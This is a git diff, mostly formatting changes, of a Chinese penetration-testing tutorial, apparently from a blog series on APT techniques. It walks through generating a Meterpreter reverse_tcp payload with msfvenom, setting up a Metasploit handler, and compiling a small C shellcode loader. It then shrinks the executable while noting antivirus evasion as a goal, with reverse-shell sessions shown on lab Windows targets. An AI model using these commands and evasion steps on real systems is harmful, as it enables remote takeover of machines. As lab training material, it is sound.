@@ -1,16 +1,13 @@
-# 专注APT攻击与防御
-https://micropoor.blogspot.com/
-
 **注：**请多喝点热水或者凉白开，可预防**肾结石，通风**等。
 痛风可伴发肥胖症、高血压病、糖尿病、脂代谢紊乱等多种代谢性疾病。
 
-**攻击机：** 
-192.168.1.5 Debian
-**靶机：** 
-192.168.1.4 Windows 7
+**攻击机：**   
+192.168.1.5 Debian  
+**靶机：**   
+192.168.1.4 Windows 7  
 192.168.1.119 Windows 2003
 
-**攻击机配置：**
+### 攻击机配置：
 
 payload：windows/meterpreter/reverse_tcp
 ```bash
@@ -43,12 +40,12 @@ msf exploit(multi/handler) > exploit
 ```
 ![](media/05b541c239afdafa628b0ef194eddcb7.jpg)
 
-**payload生成：**
-```
+### payload生成：
+```bash
 root@John:/tmp# msfvenom ‐p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=53 ‐b '\x00' ‐f exe > First.exe
 ```
 
-原始payload大小如下：
+原始payload大小如下：  
 73802字节，大概在72KB
 
 ```bash
@@ -56,7 +53,7 @@ root@John:/tmp# du ‐sb First.exe
 73802 First.exe
 ```
 
-**第一次优化payload：**
+### 第一次优化payload：
 提取windows/meterpreter/reverse_tcp shellcode
 
 ```bash
@@ -104,7 +101,7 @@ unsigned char buf[] =
 
 ![](media/bae881deb4bd31f0a9bae8e76b42317f.jpg)
 
-**源码如下：**
+### 源码如下：
 ```c++
 # include <windows.h>
 int main(void)
@@ -130,32 +127,32 @@ return EXIT_SUCCESS;
 **优化：**
 在优化的过程中，需要确保
 
-* 性能
-* 稳定性
-* 大小
-* 可塑性
-* 免杀性
+* 性能  
+* 稳定性  
+* 大小  
+* 可塑性  
+* 免杀性  
 
-**非算法，故优化/01**
+**非算法，故优化/01**  
 ![](media/161777edfb7fa266eb4210cd530675be.jpg)
 
-无使用预编译头，故否
+无使用预编译头，故否  
 ![](media/7f60d00c6e928957e7739914e27b8618.jpg)
 
-**无需调试信息，故否**
+**无需调试信息，故否**  
 ![](media/899a118c7ee938b168bcf1ae5677d2ac.jpg)
 
-**自定义入口点：execMicropoor_shellcode**
+**自定义入口点：execMicropoor_shellcode**  
 ![](media/55a9e1b87b08ce164cf6bee8167d3491.jpg)
 
-**再次编译：**
+**再次编译：**  
 ![](media/357710f6faabc6604bbaa35592ce79db.jpg)
 
-**payload大小如下：**
-4608字节
+**payload大小如下：**  
+4608字节  
 ![](media/bdd9366a5d3006aaaab48cf97908022b.jpg)
 
-**第一次靶机测试：**分别测试Windows 2003，Windws 7，reverse OK。
+### 第一次靶机测试：分别测试Windows 2003，Windws 7，reverse OK。
 
 ![](media/542ba22b5fc53ca130875f92d4bef49e.jpg)
 
@@ -171,22 +168,26 @@ Server username: WIN03X64\Administrator
 meterpreter > 
 ```
 
-**第二次优化payload：**
+### 第二次优化payload：
 
-载入PEID
+载入PEID  
 ![](media/d176f010a1d7452d445b3104d0abeadc.jpg)
 
-**合并data to text，rdata to text 在次生成。**
+**合并data to text，rdata to text 在次生成。**  
+
 ![](media/0b89c5497f2f22d399e3e7030fd521f0.jpg)
 
-**Section变化如下：**
+**Section变化如下：**  
+
 ![](media/a199a5e70d9ace704ba3501be0de41e4.jpg)
 
-**payload大小如下：**
-4096字节
+**payload大小如下：**  
+4096字节  
+
 ![](media/7b7ccfb69f47d0f2d8a901f885f2899a.jpg)
 
-**第二次靶机测试：**分别测试Windows 2003，Windws 7，reverse OK。
+**第二次靶机测试：**分别测试Windows 2003，Windws 7，reverse OK。  
+
 ![](media/a1daafaffa7abc656d309fb8429cbebf.jpg)
 
 ```bash
@@ -202,7 +203,7 @@ meterpreter > getpid
 Current pid: 1232 
 ```
 
-**第三次优化payload：**
+### 第三次优化payload：
 
 在00000E60起含有大部分000h，充填掉00，在次生成payload。
 
@@ -224,11 +225,14 @@ Current pid: 1232
 ```
 ![](media/22aa6b22b6a725c1cd042fe3d272c195.jpg)
 
-**payload大小如下：**
-3174字节
+**payload大小如下：**  
+
+3174字节  
+
 ![](media/583f8432508fadce87963dda9074623a.jpg)
 
-**第三次靶机测试：**分别测试Windows 2003，Windws 7，reverse OK。并且最终编译运行库依然为：**/MT**
+**第三次靶机测试：**分别测试Windows 2003，Windws 7，reverse OK。并且最终编译运行库依然为：**/MT**  
+
 ![](media/4e172aa523497f62e049cc0e7dfb622a.jpg)
 
 ![](media/25c74a3a578b2e23477821175b489769.jpg)
@@ -250,7 +254,7 @@ Server username: NT AUTHORITY\SYSTEM
 ```
 ![](media/74defd3d7b4b42c88aadac9d9d4fd476.jpg)
 
-**第四次优化payload：**
+### 第四次优化payload：
 
 .......
 
